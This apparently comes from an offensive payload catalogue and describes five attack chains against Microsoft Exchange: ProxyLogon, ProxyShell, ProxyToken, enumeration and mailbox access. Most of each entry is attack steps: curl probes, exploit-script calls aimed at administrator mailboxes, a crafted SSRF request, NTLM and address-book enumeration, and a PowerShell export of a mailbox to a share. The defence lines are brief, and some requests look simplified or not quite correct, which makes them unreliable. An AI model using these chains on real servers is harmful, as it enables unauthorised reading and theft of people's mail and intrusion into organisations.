# Exchange Attacks

_5 intranet payloads_

### ProxyLogon Attack  `proxylogon`
_CVE-2021-26855 Exchange SSRF_
Subclass: **ProxyLogon** · tags: `exchange` `proxylogon` `cve-2021-26855`

**Prerequisites:**
- Exchange reachable

**Attack chain:**

**Detect vulnerability**
> Check Exchange version
_platform: linux_
```
curl -k https://exchange.com/owa/auth/x.js
Check Exchange version
```

**Exploit script**
> Exploit ProxyLogon
_platform: linux_
```
python proxylogon.py -u https://exchange.com -e admin@domain.com
Obtain access to the administrator mailbox
```
**Syntax breakdown:**
- `-u` — Exchange URL _parameter_
- `-e` — target mailbox _parameter_

**Manual exploitation**
> Manually craft the request
```
POST /owa/auth/x.js HTTP/1.1
Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;
X-ClientId=xxx

Craft the SSRF request
```

**Overview:** ProxyLogon is an SSRF vulnerability in Exchange.

**Vulnerability principle:** The Exchange front end has an SSRF vulnerability.

**Exploitation method:** Flow: 1) Detect Exchange 2) Craft SSRF request 3) Obtain access

**Defenses:** 1) Install patches 2) Network isolation 3) Monitor abnormal requests

---

### ProxyShell attack  `proxyshell`
_CVE-2021-34473 Exchange RCE_
Subclass: **ProxyShell** · tags: `exchange` `proxyshell` `cve-2021-34473`

**Prerequisites:**
- Exchange reachable

**Attack chain:**

**Detect vulnerability**
> Detect vulnerability
_platform: linux_
```
curl -k "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"
Check whether the vulnerability is present
```

**Exploit script**
> Exploit ProxyShell
_platform: linux_
```
python proxyshell.py -u https://exchange.com -e admin@domain.com
Obtain mailbox access and execute commands
```

**Retrieve mail**
> Access the mailbox
```
GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTTP/1.1
Access mailbox contents
```

**Overview:** ProxyShell is an RCE vulnerability chain in Exchange.

**Vulnerability principle:** Exchange has SSRF and RCE vulnerabilities.

**Exploitation method:** Exploitation flow: 1) Detect vulnerability 2) Obtain access token 3) Execute commands

**Defenses:** Defenses: 1) Install patches 2) Network isolation 3) Monitor abnormal requests

---

### Exchange enumeration  `exchange-enum`
_Enumerate Exchange services and configuration_
Subclass: **Enumeration** · tags: `exchange` `enum` `recon`

**Prerequisites:**
- Exchange reachable

**Attack chain:**

**Version detection**
> Detect the Exchange version
_platform: linux_
```
curl -k https://exchange.com/owa/auth/logon.aspx
Inspect the page source to obtain version information
```

**Autodiscover**
> Autodiscover enumeration
_platform: linux_
```
curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml
Obtain Exchange configuration information
```

**Mailbox enumeration**
> Enumerate mailbox users
_platform: linux_
```
python oab.py https://exchange.com
Download the offline address book to enumerate users
```

**NTLM leak**
> NTLM information disclosure
_platform: linux_
```
curl -k https://exchange.com/autodiscover/autodiscover.xml
Obtain domain information from the WWW-Authenticate header
```

**Overview:** Exchange enumeration can obtain a large amount of information.

**Vulnerability principle:** Exchange exposes too much information.

**Exploitation method:** Exploitation flow: 1) Detect version 2) Enumerate users 3) Obtain configuration

**Defenses:** Defenses: 1) Hide version information 2) Restrict access 3) Monitor abnormal requests

---

### ProxyToken attack  `exchange-proxytoken`
_Use Exchange ProxyToken to bypass authentication_
Subclass: **ProxyToken** · tags: `exchange` `proxytoken` `bypass`

**Prerequisites:**
- Exchange server
- Vulnerability present

**Attack chain:**

**Detect vulnerability**
> Detect vulnerability
_platform: linux_
```
Use the ProxyToken tool:
python proxytoken.py -u https://exchange.com -e user@domain.com
Detect whether the vulnerability is present
```

**Exploit the vulnerability**
> Obtain mailbox access
_platform: linux_
```
python proxytoken.py -u https://exchange.com -e user@domain.com -a
Obtain access to the user's mailbox
```
**Syntax breakdown:**
- `ProxyToken` — abuse the front-end proxy authentication bypass _keyword_
- `EWS interface` — access the mailbox via EWS _keyword_

**Access the mailbox**
> Access the EWS interface
```
curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"
Bypass authentication to access EWS
```

**Overview:** ProxyToken abuses a front-end proxy authentication flaw in Exchange.

**Vulnerability principle:** The Exchange front-end proxy does not correctly validate authentication.

**Exploitation method:** Exploitation flow: 1) Detect vulnerability 2) Craft the request 3) Bypass authentication to access the mailbox

**Defenses:** Defenses: 1) Install patches 2) Strengthen authentication validation 3) Monitor abnormal requests

---

### Exchange mailbox access  `exchange-mailbox-access`
_Access Exchange mailboxes through various means_
Subclass: **Mailbox access** · tags: `exchange` `mailbox` `access`

**Prerequisites:**
- Exchange credentials or a vulnerability

**Attack chain:**

**OWA access**
> OWA web access
```
https://exchange.com/owa
Log in to OWA with credentials
View mail, calendar, and so on
```

**EWS access**
> EWS API access
_platform: linux_
```
Use Impacket:
python exchanger.py domain/user:password@exchange.com
Or use EWSTools
```

**Outlook MAPI**
> Outlook client
_platform: windows_
```
Configure Outlook to connect to Exchange
Use the MAPI protocol to access the mailbox
Supports mail, calendar, and contacts
```
**Syntax breakdown:**
- `OWA` — Outlook Web App _keyword_
- `EWS` — Exchange Web Services _keyword_
- `MAPI` — Messaging API _keyword_

**Export the mailbox**
> Export the mailbox
_platform: windows_
```
PowerShell:
New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user.pst"
Export the mailbox to a PST file
```

**Overview:** Exchange mailboxes can be accessed through multiple protocols.

**Vulnerability principle:** Once credentials are obtained, the mailbox can be fully controlled.

**Exploitation method:** Exploitation flow: 1) Obtain credentials 2) Choose an access method 3) Access mailbox data

**Defenses:** Defenses: 1) MFA authentication 2) Monitor abnormal logins 3) Audit mailbox access

---
